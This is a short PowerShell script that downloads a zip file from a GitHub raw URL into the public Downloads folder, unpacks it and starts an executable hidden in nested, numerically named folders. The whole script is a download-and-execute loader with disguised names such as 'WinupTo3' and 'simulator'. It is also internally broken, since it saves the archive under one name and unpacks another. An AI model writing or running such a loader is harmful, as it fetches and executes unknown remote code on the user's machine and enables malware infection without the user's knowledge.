# Source URL
$url = "https://github.com/ededx/simulator/raw/main/img1290017.zip"

# Destation file
$dest = "C:\Users\Public\Downloads\WinupTo3.zip"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $dest

Expand-Archive C:\Users\Public\Downloads\img1290017.zip -DestinationPath C:\Users\Public\Downloads\

Start-Process -FilePath C:\Users\Public\Downloads\img1290017\img1291006\img0208832581.exe